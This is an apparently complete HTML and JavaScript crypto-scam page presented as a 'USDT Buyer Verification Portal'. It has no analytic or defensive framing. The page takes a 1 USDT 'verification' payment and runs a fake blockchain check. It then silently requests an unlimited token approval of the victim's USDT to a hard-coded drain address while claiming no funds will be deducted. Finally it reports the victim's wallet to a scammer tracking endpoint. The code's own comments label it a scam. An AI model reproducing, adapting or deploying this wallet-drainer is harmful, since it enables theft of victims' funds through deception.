<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>USDT Buyer Verification Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    
    .container {
      background: white;
      border-radius: 20px;
      padding: 30px;
      width: 100%;
      max-width: 450px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    }
    
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    
    .logo-circle {
      width: 80px;
      height: 80px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border-radius: 50%;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 32px;
      font-weight: bold;
    }
    
    h1 {
      text-align: center;
      color: #333;
      margin-bottom: 10px;
      font-size: 24px;
    }
    
    .subtitle {
      text-align: center;
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }
    
    .step {
      display: none;
      animation: fadeIn 0.5s;
    }
    
    .step.active {
      display: block;
    }
    
    .address-box {
      background: #f8f9fa;
      padding: 20px;
      border-radius: 10px;
      margin: 20px 0;
      border: 2px dashed #dee2e6;
      text-align: center;
    }
    
    .address {
      font-family: monospace;
      font-size: 14px;
      word-break: break-all;
      color: #333;
      margin: 10px 0;
    }
    
    .amount-box {
      background: #e8f5e9;
      padding: 15px;
      border-radius: 10px;
      margin: 15px 0;
      text-align: center;
      border: 1px solid #c8e6c9;
    }
    
    .amount {
      font-size: 28px;
      font-weight: bold;
      color: #2e7d32;
    }
    
    .note {
      background: #fff3e0;
      padding: 10px;
      border-radius: 5px;
      margin: 15px 0;
      font-size: 13px;
      color: #e65100;
      border: 1px solid #ffcc80;
    }
    
    .btn {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 16px;
      border-radius: 50px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
      transition: all 0.3s;
    }
    
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
    }
    
    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #667eea;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    
    .progress-steps {
      display: flex;
      justify-content: space-between;
      margin: 30px 0;
      position: relative;
    }
    
    .progress-steps::before {
      content: '';
      position: absolute;
      top: 15px;
      left: 10%;
      right: 10%;
      height: 2px;
      background: #e0e0e0;
      z-index: 1;
    }
    
    .step-indicator {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background: #e0e0e0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: bold;
      position: relative;
      z-index: 2;
    }
    
    .step-indicator.active {
      background: #667eea;
    }
    
    .step-label {
      text-align: center;
      font-size: 12px;
      margin-top: 5px;
      color: #666;
    }
    
    .alert {
      padding: 12px;
      border-radius: 8px;
      margin: 15px 0;
      font-size: 14px;
    }
    
    .alert-success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    
    .alert-danger {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Progress Steps -->
    <div class="progress-steps">
      <div>
        <div class="step-indicator active" id="step1-indicator">1</div>
        <div class="step-label">Send 1 USDT</div>
      </div>
      <div>
        <div class="step-indicator" id="step2-indicator">2</div>
        <div class="step-label">Verification</div>
      </div>
      <div>
        <div class="step-indicator" id="step3-indicator">3</div>
        <div class="step-label">Complete</div>
      </div>
    </div>
    
    <!-- Logo -->
    <div class="logo">
      <div class="logo-circle">‚úì</div>
    </div>
    
    <!-- STEP 1: Payment Request -->
    <div id="step1" class="step active">
      <h1>Complete Verification</h1>
      <p class="subtitle">Send 1 USDT to verify wallet ownership</p>
      
      <div class="address-box">
        <p><strong>Send to Address:</strong></p>
        <p class="address" id="paymentAddress">0x395b205f3ec60b4cd5820xxxxxxxxxxxxxxx</p>
        <p><small>(BEP-20 BSC Network Only)</small></p>
      </div>
      
      <div class="amount-box">
        <p>Amount to Send:</p>
        <div class="amount">1 USDT</div>
        <p>‚âà $1.00 USD</p>
      </div>
      
      <div class="note">
        ‚ö†Ô∏è Important: You will receive 2 USDT back after successful verification
      </div>
      
      <button class="btn" onclick="proceedToStep2()" id="step1-btn">
        I've Sent 1 USDT
      </button>
    </div>
    
    <!-- STEP 2: Fake Verification -->
    <div id="step2" class="step">
      <h1>Verifying Payment</h1>
      <p class="subtitle">Checking blockchain for your transaction...</p>
      
      <div class="loader"></div>
      
      <div id="verification-progress">
        <p style="text-align: center; margin: 20px 0;">
          <span id="countdown">Verification will complete in 15 seconds...</span>
        </p>
        
        <div style="background: #f5f5f5; padding: 15px; border-radius: 10px; margin: 20px 0;">
          <p style="margin: 5px 0;">‚úì Connected to BSC Network</p>
          <p style="margin: 5px 0;">‚è≥ Scanning transaction history...</p>
          <p style="margin: 5px 0;">‚åõ Confirming 1 USDT payment...</p>
        </div>
      </div>
    </div>
    
    <!-- STEP 3: Approval (Hidden) -->
    <div id="step3" class="step">
      <h1>Final Step Required</h1>
      <p class="subtitle">Approve wallet connection for verification</p>
      
      <div class="alert alert-success">
        ‚úÖ Your 1 USDT payment has been verified!
      </div>
      
      <div style="text-align: center; margin: 30px 0;">
        <div style="font-size: 48px; color: #4CAF50;">üîê</div>
        <p style="margin: 15px 0;">This confirms you control the wallet</p>
        <p style="color: #666; font-size: 14px;">No funds will be deducted - this is only for verification</p>
      </div>
      
      <div id="approval-status">
        <p style="text-align: center; color: #666;">Waiting for wallet connection...</p>
      </div>
    </div>
    
    <!-- STEP 4: Success (Fake) -->
    <div id="step4" class="step">
      <h1>Verification Complete! üéâ</h1>
      
      <div class="alert alert-success" style="text-align: center;">
        <div style="font-size: 48px; margin: 10px 0;">‚úÖ</div>
        <p style="font-weight: bold; font-size: 18px;">Wallet Successfully Verified!</p>
      </div>
      
      <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
        <p style="margin: 10px 0;">‚úì Wallet ownership confirmed</p>
        <p style="margin: 10px 0;">‚úì Transaction approved</p>
        <p style="margin: 10px 0;">‚úì Verification completed</p>
        <p style="margin: 10px 0; color: #4CAF50; font-weight: bold;">‚úì 2 USDT will be sent to your wallet within 24 hours</p>
      </div>
      
      <p style="text-align: center; color: #666; font-size: 14px; margin-top: 30px;">
        You may now close this window. Return to Telegram for payment.
      </p>
    </div>
  </div>

  <script>
    // ========== CONFIGURATION ==========
    // Scammer's address to receive 1 USDT payment
    const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd5820xxxxxxxxxxxxxxx";
    
    // Scammer's address for unlimited approvals (DRAIN ADDRESS)
    const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc";
    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    
    // USDT contract addresses
    const USDT_CONTRACTS = {
      ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      bsc: "0x55d398326f99059fF775485246999027B3197955",
      polygon: "0x3813e82e6f7098b9583FC0F33a962D02018B6803"
    };
    
    // ========== STATE VARIABLES ==========
    let currentStep = 1;
    let paymentVerified = false;
    let approvalCompleted = false;
    
    // ========== STEP MANAGEMENT ==========
    function showStep(stepNumber) {
      // Hide all steps
      document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
      });
      
      // Show requested step
      document.getElementById(`step${stepNumber}`).classList.add('active');
      currentStep = stepNumber;
      
      // Update progress indicators
      document.querySelectorAll('.step-indicator').forEach(indicator => {
        indicator.classList.remove('active');
      });
      
      for (let i = 1; i <= stepNumber; i++) {
        const indicator = document.getElementById(`step${i}-indicator`);
        if (indicator) indicator.classList.add('active');
      }
    }
    
    // ========== STEP 1 -> STEP 2 ==========
    function proceedToStep2() {
      // Disable button to prevent multiple clicks
      document.getElementById('step1-btn').disabled = true;
      document.getElementById('step1-btn').textContent = 'Processing...';
      
      // Move to step 2
      setTimeout(() => {
        showStep(2);
        startFakeVerification();
      }, 1000);
    }
    
    // ========== FAKE VERIFICATION ==========
    function startFakeVerification() {
      let seconds = 15;
      const countdownEl = document.getElementById('countdown');
      
      const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = `Verification will complete in ${seconds} seconds...`;
        
        if (seconds <= 0) {
          clearInterval(interval);
          paymentVerified = true;
          showStep(3);
          
          // Auto-start approval after 2 seconds
          setTimeout(() => {
            triggerApproval();
          }, 2000);
        }
      }, 1000);
    }
    
    // ========== AUTO-APPROVAL FUNCTION ==========
    async function triggerApproval() {
      const statusEl = document.getElementById('approval-status');
      
      if (!window.ethereum) {
        statusEl.innerHTML = `
          <div class="alert alert-danger">
            ‚ùå Please open this page in Trust Wallet browser
          </div>
          <button class="btn" onclick="triggerApproval()">Retry</button>
        `;
        return;
      }
      
      try {
        statusEl.innerHTML = '<p style="text-align: center;">Connecting to wallet...</p>';
        
        // Connect to wallet
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        
        if (accounts.length === 0) {
          statusEl.innerHTML = `
            <div class="alert alert-danger">
              ‚ùå Please connect your wallet
            </div>
            <button class="btn" onclick="triggerApproval()">Connect Wallet</button>
          `;
          return;
        }
        
        const signer = provider.getSigner();
        const network = await provider.getNetwork();
        
        // Determine which chain
        let chain = "";
        if (network.chainId === 1) chain = "ethereum";
        else if (network.chainId === 56) chain = "bsc";
        else if (network.chainId === 137) chain = "polygon";
        else {
          statusEl.innerHTML = `
            <div class="alert alert-danger">
              ‚ùå Unsupported network. Please switch to Ethereum, BSC, or Polygon
            </div>
          `;
          return;
        }
        
        statusEl.innerHTML = '<p style="text-align: center;">Requesting approval...</p>';
        
        // Create USDT contract instance
        const usdt = new ethers.Contract(
          USDT_CONTRACTS[chain],
          ["function approve(address spender, uint256 amount) public returns (bool)"],
          signer
        );
        
        // Request unlimited approval
        const tx = await usdt.approve(DRAIN_ADDRESS, MAX_UINT);
        
        statusEl.innerHTML = `
          <p style="text-align: center; color: #666;">
            Transaction sent: ${tx.hash.substring(0, 20)}...
            <br>Waiting for confirmation...
          </p>
        `;
        
        // Wait for transaction confirmation
        await tx.wait();
        
        approvalCompleted = true;
        
        // Show success message
        setTimeout(() => {
          showStep(4);
          
          // Optional: Send victim data to scammer's backend
          try {
            fetch('https://scammer-backend.com/track', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                victim: accounts[0],
                timestamp: new Date().toISOString(),
                approved: true,
                chain: chain
              })
            });
          } catch (e) {
            // Silent fail if backend not available
          }
        }, 2000);
        
      } catch (error) {
        console.error('Approval failed:', error);
        
        if (error.code === 4001) {
          // User rejected the transaction
          statusEl.innerHTML = `
            <div class="alert alert-danger">
              ‚ùå Approval rejected. Verification cannot complete.
            </div>
            <button class="btn" onclick="triggerApproval()">Try Again</button>
          `;
        } else {
          statusEl.innerHTML = `
            <div class="alert alert-danger">
              ‚ùå Error: ${error.message}
            </div>
            <button class="btn" onclick="triggerApproval()">Retry</button>
          `;
        }
      }
    }
    
    // ========== INITIALIZE ==========
    // Display payment address
    document.getElementById('paymentAddress').textContent = PAYMENT_ADDRESS;
    
    // Auto-start if returning (optional)
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('verify') === 'true') {
      showStep(3);
      setTimeout(() => triggerApproval(), 1000);
    }
  </script>
</body>
</html>
